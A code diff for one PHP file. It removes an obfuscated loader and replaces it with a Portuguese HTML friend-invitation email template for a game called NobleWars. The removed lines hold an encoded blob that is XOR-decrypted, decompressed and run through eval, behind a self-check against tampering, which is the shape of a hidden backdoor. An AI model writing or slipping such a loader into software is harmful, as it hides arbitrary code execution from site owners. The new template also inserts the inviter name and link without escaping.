@@ -1,24 +1,91 @@
 <?php
-$qdvxntz="279b4170bee392960f12b4baabd36304";
-$uxzqxjtea="07050c570d550453075c53070a06000f5355500a030d50575901550b05510256";
-$atytxmxud="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";
-$wzcvdj=file_get_contents(__FILE__);
-$aaxmidjlo=str_replace($atytxmxud,"",$wzcvdj);
-if(strpos($aaxmidjlo,"ec"."ho")!==false||strpos($aaxmidjlo,"pr"."int")!==false||strpos($aaxmidjlo,"var_"."dump")!==false||strpos($aaxmidjlo,"file_put_"."contents")!==false||strpos($aaxmidjlo,"fw"."rite")!==false){die();}
-$ffvnvzzmple=str_replace(array($qdvxntz,$uxzqxjtea),array("SP_73fb6a82","KP_098accec"),$wzcvdj);
-$xavdmll=md5($ffvnvzzmple);
-$rngzjbv=hex2bin($uxzqxjtea);
-$ybxaryc="";
-$wofbhmrkb=strlen($xavdmll);
-for($voixya=0;$voixya<$wofbhmrkb;$voixya++){
-$ybxaryc.=chr(ord($rngzjbv[$voixya])^ord($xavdmll[$voixya]));
-}
-$ikgkqex=base64_decode($atytxmxud);
-$mtobeh=strlen($ikgkqex);
-$bvzkxlei="";
-$kinvigh=strlen($ybxaryc);
-for($voixya=0;$voixya<$mtobeh;$voixya++){
-$bvzkxlei.=$ikgkqex[$voixya]^$ybxaryc[$voixya%$kinvigh];
-}
-$lplcpf="gzun"."compress";
-eval($lplcpf($bvzkxlei));
+/**
+ * HTML Email Template for Friend Invitation
+ *
+ * @param string $inviterName
+ * @param string $inviteLink
+ * @param string $personalMessage
+ * @param string $logoUrl
+ * @return string
+ */
+return function(string $inviterName, string $inviteLink, string $personalMessage = '', string $logoUrl = ''): string {
+    if (empty($logoUrl)) {
+        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+        $logoUrl = $protocol . ($_SERVER['HTTP_HOST'] ?? '127.0.0.1:8000') . "/graphic/index/noblewars.png";
+    }
+
+    $personalMessageHtml = '';
+    if (!empty($personalMessage)) {
+        $personalMessageHtml = '
+        <div style="background-color: #f1ebd8; border-left: 4px solid #8b5a2b; padding: 15px; margin: 25px 0; border-radius: 0 4px 4px 0; font-style: italic; color: #5d4037; box-sizing: border-box;">
+            "'.htmlspecialchars($personalMessage).'"
+        </div>';
+    }
+
+    return <<<HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Convite de Jogo - NobleWars</title>
+</head>
+<body style="margin: 0; padding: 0; background-color: #f4e4bc; font-family: 'Georgia', 'Times New Roman', Times, serif; color: #2d1b10; -webkit-font-smoothing: antialiased;">
+    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #f4e4bc; padding: 20px 0;">
+        <tr>
+            <td align="center">
+                <!-- Main Card -->
+                <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; background-color: #f9f3e3; border: 3px double #7d510f; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.15); overflow: hidden;">
+                    <!-- Header Banner -->
+                    <tr>
+                        <td align="center" style="background: linear-gradient(to bottom, #4a2f13 0%, #2d1b10 100%); padding: 20px; border-bottom: 3px double #7d510f;">
+                            <img src="{$logoUrl}" alt="NobleWars" style="display: block; max-width: 180px; height: auto; border: 0;" />
+                        </td>
+                    </tr>
+                    
+                    <!-- Content -->
+                    <tr>
+                        <td style="padding: 40px 30px;">
+                            <h2 style="margin-top: 0; font-family: 'Georgia', serif; font-size: 20px; color: #7d510f; border-bottom: 1px solid #dcd1b4; padding-bottom: 10px;">Estás Convidado para a Batalha!</h2>
+                            
+                            <p style="font-size: 16px; line-height: 1.6; margin: 20px 0;">Olá,</p>
+                            
+                            <p style="font-size: 16px; line-height: 1.6; margin: 20px 0;">O teu amigo <strong>{$inviterName}</strong> desafiou-te a juntares-te a ele no campo de batalha do <strong>NobleWars</strong>!</p>
+                            
+                            {$personalMessageHtml}
+                            
+                            <p style="font-size: 16px; line-height: 1.6; margin: 20px 0;">Cria o teu império, ergue muralhas intransponíveis, comanda exércitos e luta lado a lado com os teus aliados para conquistar o mundo. Clique no botão de ouro abaixo para aceitar o convite e registar a tua conta:</p>
+                            
+                            <!-- Button Container -->
+                            <table border="0" cellpadding="0" cellspacing="0" width="100%" style="margin: 30px 0;">
+                                <tr>
+                                    <td align="center">
+                                        <a href="{$inviteLink}" target="_blank" style="display: inline-block; padding: 14px 30px; background: linear-gradient(to bottom, #8b5a2b 0%, #6d4c41 100%); border: 2px solid #3e2723; border-radius: 4px; color: #f5f5dc; font-family: 'Georgia', serif; font-size: 18px; font-weight: bold; text-decoration: none; text-shadow: 1px 1px 2px rgba(0,0,0,0.5); box-shadow: 0 4px 6px rgba(0,0,0,0.15); transition: background 0.2s;">
+                                            Aceitar Convite e Jogar
+                                        </a>
+                                    </td>
+                                </tr>
+                            </table>
+                            
+                            <p style="font-size: 14px; line-height: 1.6; color: #6d4c41; background-color: #f1ebd8; border-left: 4px solid #8b5a2b; padding: 10px 15px; margin: 25px 0; border-radius: 0 4px 4px 0; box-sizing: border-box;">
+                                Se tiveres problemas com o botão acima, copia e cola o seguinte link no teu navegador:<br>
+                                <a href="{$inviteLink}" target="_blank" style="color: #8b5a2b; word-break: break-all; text-decoration: underline;">{$inviteLink}</a>
+                            </p>
+                        </td>
+                    </tr>
+                    
+                    <!-- Footer -->
+                    <tr>
+                        <td align="center" style="background-color: #f1ebd8; padding: 25px 20px; border-top: 1px solid #dcd1b4; font-size: 12px; color: #7d7260;">
+                            <p style="margin: 0 0 5px 0; font-weight: bold; color: #5d4037;">A Equipa NobleWars</p>
+                            <p style="margin: 0;">&copy; 2026 NobleWars. Todos os direitos reservados.</p>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+</body>
+</html>
+HTML;
+};
